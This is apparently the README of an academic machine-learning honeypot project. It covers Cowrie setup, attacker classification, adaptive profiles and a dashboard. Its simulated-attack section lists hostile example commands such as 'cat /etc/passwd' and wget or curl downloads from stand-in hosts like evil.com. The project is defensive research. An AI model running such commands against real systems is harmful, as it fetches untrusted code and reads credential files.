# ML-Powered Honeypot Implementation

A dynamic, machine learning-powered honeypot system that adapts its behavior based on real-time threat analysis. This implementation focuses on delivering core functionality with strategic scope reduction for a 3-month development timeline.

## 🎯 Project Overview

This ML-powered honeypot system demonstrates the core innovation of **dynamic adaptation** - the honeypot changes its behavior based on machine learning analysis of attacker patterns. The system classifies attackers into three threat levels (scanner, amateur, advanced) and automatically adjusts the honeypot's responses accordingly.

### Key Features

- **Real-time Threat Classification**: XGBoost-based ML model categorizes attackers
- **Dynamic Behavior Adaptation**: Honeypot automatically switches between profiles
- **Comprehensive Monitoring**: Web dashboard with real-time metrics and visualizations
- **Elasticsearch Integration**: Centralized log storage and querying
- **Automated Response**: System adapts without human intervention

## 🏗️ Architecture

### Core Components

1. **Cowrie SSH Honeypot**: Primary honeypot generating attack data
2. **Feature Extractor**: Processes logs to extract behavioral features
3. **Threat Classifier**: XGBoost model for threat level prediction
4. **Dynamic Adaptation Engine**: Modifies honeypot behavior based on ML predictions
5. **Monitoring Dashboard**: Web interface for system visualization

### Honeypot Profiles

- **Minimal**: For scanners - limited responses, resource conservation
- **Standard**: For amateurs - default Cowrie configuration
- **Deception**: For advanced threats - enhanced countermeasures, fake files

## 🚀 Quick Start

### Prerequisites

- Ubuntu 20.04+ or similar Linux distribution
- Python 3.8+
- Root access for system configuration
- 2GB+ RAM, 10GB+ disk space

### Installation

1. **Clone the repository**:
   ```bash
   git clone <repository-url>
   cd ml-honeypot
   ```

2. **Run the setup script** (requires root):
   ```bash
   sudo python scripts/setup_cowrie.py
   ```

3. **Install Python dependencies**:
   ```bash
   pip install -r requirements.txt
   ```

4. **Start the system**:
   ```bash
   python main.py
   ```

5. **Access the dashboard**:
   Open http://localhost:5000 in your browser

### Manual Setup (Alternative)

If the automated setup fails, follow these manual steps:

1. **Install Cowrie**:
   ```bash
   sudo apt update
   sudo apt install python3 python3-pip python3-venv git
   sudo useradd -m -s /bin/bash cowrie
   sudo -u cowrie git clone https://github.com/cowrie/cowrie.git /opt/cowrie
   sudo -u cowrie python3 -m venv /opt/cowrie/cowrie-env
   sudo -u cowrie /opt/cowrie/cowrie-env/bin/pip install -r /opt/cowrie/requirements.txt
   ```

2. **Install Elasticsearch**:
   ```bash
   sudo apt install openjdk-11-jdk
   wget -qO - https://artifacts.elastic.co/GPG-KEY-elasticsearch | sudo apt-key add -
   echo "deb https://artifacts.elastic.co/packages/8.x/apt stable main" | sudo tee /etc/apt/sources.list.d/elastic-8.x.list
   sudo apt update
   sudo apt install elasticsearch
   sudo systemctl enable elasticsearch
   sudo systemctl start elasticsearch
   ```

3. **Configure Cowrie**:
   ```bash
   sudo mkdir -p /opt/cowrie/etc /var/log/cowrie
   sudo chown cowrie:cowrie /var/log/cowrie
   ```

## 📊 System Testing

Run the comprehensive test suite to validate system functionality:

```bash
python scripts/test_system.py
```

This will test:
- Feature extraction from logs
- ML model training and prediction
- Dynamic adaptation logic
- Dashboard functionality
- Elasticsearch connectivity
- Integration between components

## 🔧 Configuration

### Main Configuration (`configs/config.yaml`)

```yaml
# Elasticsearch settings
elasticsearch:
  host: localhost
  port: 9200
  index: honeypot-logs

# Cowrie honeypot settings
cowrie:
  log_path: /var/log/cowrie/cowrie.json
  config_path: /opt/cowrie/etc/cowrie.cfg
  profiles:
    minimal:
      enabled_commands: ["ls", "pwd", "whoami"]
      response_delay: 0.1
      fake_files: []
    standard:
      enabled_commands: ["ls", "pwd", "whoami", "cat", "cd", "ps", "netstat"]
      response_delay: 0.5
      fake_files: ["passwd", "shadow"]
    deception:
      enabled_commands: ["ls", "pwd", "whoami", "cat", "cd", "ps", "netstat", "wget", "curl", "ssh"]
      response_delay: 2.0
      fake_files: ["passwd", "shadow", "id_rsa", "config", "database.conf"]

# ML model settings
ml:
  model_path: models/threat_classifier.pkl
  features:
    - session_duration
    - command_count
    - unique_commands
    - failed_logins
    - suspicious_commands
  thresholds:
    scanner: 0.3
    amateur: 0.7
    advanced: 0.9

# Adaptation settings
adaptation:
  check_interval: 60  # seconds
  min_sessions: 5     # minimum sessions before adaptation
  cooldown: 300       # seconds between adaptations

# Monitoring settings
monitoring:
  dashboard_port: 5000
  alert_email: admin@example.com
```

## 📈 Usage Examples

### Basic Operation

1. **Start the system**:
   ```bash
   python main.py
   ```

2. **Monitor via dashboard**: http://localhost:5000

3. **Check logs**:
   ```bash
   tail -f logs/honeypot.log
   ```

### Testing with Simulated Attacks

1. **Connect to honeypot**:
   ```bash
   ssh -p 2222 admin@localhost
   ```

2. **Execute various commands** to trigger different threat classifications:
   - Scanner: `ls`, `pwd`, `whoami`
   - Amateur: `cat /etc/passwd`, `ps aux`
   - Advanced: `wget http://malicious.com/script.sh`, `curl -O http://evil.com/tool`

3. **Observe adaptations** in the dashboard and logs

### Manual Profile Switching

```python
from src.adaptation.dynamic_adaptation import DynamicAdaptationEngine

engine = DynamicAdaptationEngine()
result = engine.force_adaptation("deception", "Manual test")
print(f"Adapted to: {result['new_profile']}")
```

## 🔍 Monitoring and Analysis

### Dashboard Features

- **Real-time Status**: System health and current profile
- **Threat Distribution**: Visual breakdown of attacker types
- **Adaptation History**: Timeline of profile changes
- **Session Metrics**: Activity patterns and statistics
- **Performance Charts**: Interactive visualizations

### Log Analysis

The system generates several types of logs:

- **Application Logs**: `logs/honeypot.log` - Main system operations
- **Cowrie Logs**: `/var/log/cowrie/cowrie.json` - Honeypot interactions
- **Adaptation Logs**: `data/adaptation_history.json` - Profile changes
- **Elasticsearch**: Centralized storage for all events

### Key Metrics

- **Threat Classification Accuracy**: ML model performance
- **Adaptation Frequency**: How often the system changes behavior
- **Session Duration**: Time spent by attackers
- **Command Patterns**: Most common attack techniques

## 🛠️ Development and Customization

### Adding New Features

1. **New Threat Indicators**:
   - Modify `FeatureExtractor` to add new behavioral features
   - Update the ML model training pipeline

2. **Custom Honeypot Profiles**:
   - Add new profiles to `config.yaml`
   - Update `DynamicAdaptationEngine` logic

3. **Enhanced Monitoring**:
   - Extend `HoneypotDashboard` with new visualizations
   - Add custom alerting mechanisms

### Model Retraining

The system supports continuous learning:

```python
from src.ml.threat_classifier import ThreatClassifier

classifier = ThreatClassifier()
# Load new training data
new_features = extractor.extract_batch_features(new_logs)
# Retrain with feedback
metrics = classifier.retrain_with_feedback(new_features, corrected_labels)
```

## 🚨 Troubleshooting

### Common Issues

1. **Elasticsearch Connection Failed**:
   ```bash
   sudo systemctl status elasticsearch
   sudo systemctl restart elasticsearch
   ```

2. **Cowrie Not Starting**:
   ```bash
   sudo systemctl status cowrie
   sudo journalctl -u cowrie -f
   ```

3. **Permission Errors**:
   ```bash
   sudo chown -R cowrie:cowrie /opt/cowrie
   sudo chown -R cowrie:cowrie /var/log/cowrie
   ```

4. **Python Import Errors**:
   ```bash
   pip install -r requirements.txt
   export PYTHONPATH="${PYTHONPATH}:$(pwd)/src"
   ```

### Debug Mode

Run with verbose logging:

```bash
python main.py --debug
```

### System Health Check

```bash
python scripts/test_system.py
```

## 📚 Technical Details

### ML Model Architecture

- **Algorithm**: XGBoost Classifier
- **Features**: 17 behavioral indicators
- **Classes**: Scanner, Amateur, Advanced
- **Training**: Synthetic data + real attack logs
- **Performance**: Target 85%+ accuracy

### Feature Engineering

The system extracts 17 key features from session logs:

- **Temporal**: Session duration, commands per minute
- **Behavioral**: Command diversity, suspicious command ratio
- **Authentication**: Login success rate, failed attempts
- **Activity**: Command count, unique commands
- **Threat Indicators**: Suspicious command usage, high activity flags

### Adaptation Logic

The system uses a rule-based approach for profile selection:

- **Scanner Dominant** (>70% scanners) → Minimal Profile
- **Advanced Threats** (>30% advanced) → Deception Profile
- **High Confidence** (>2 high-confidence sessions) → Deception Profile
- **Mixed/Amateur** → Standard Profile

## 🎓 Academic Context

This implementation represents a **proof-of-concept** for ML-powered dynamic honeypots. Key academic contributions:

1. **Novel Adaptation Framework**: First implementation of real-time ML-driven honeypot adaptation
2. **Behavioral Feature Engineering**: Comprehensive feature set for attacker classification
3. **Practical Deployment**: Working system with measurable security outcomes
4. **Performance Metrics**: Quantifiable adaptation effectiveness

### Research Applications

- **Threat Intelligence**: Automated attacker profiling
- **Honeypot Evolution**: Dynamic response to changing attack patterns
- **ML in Security**: Practical application of machine learning in cybersecurity
- **Adaptive Defense**: Self-modifying security systems

## 📄 License

This project is licensed under the MIT License - see the LICENSE file for details.

## 🤝 Contributing

This is an academic project, but contributions are welcome:

1. Fork the repository
2. Create a feature branch
3. Make your changes
4. Add tests for new functionality
5. Submit a pull request

## 📞 Support

For questions or issues:

1. Check the troubleshooting section
2. Run the test suite
3. Review the logs
4. Create an issue with detailed information

---

**Note**: This is a research/educational implementation. For production use, additional security hardening, error handling, and performance optimization would be required.
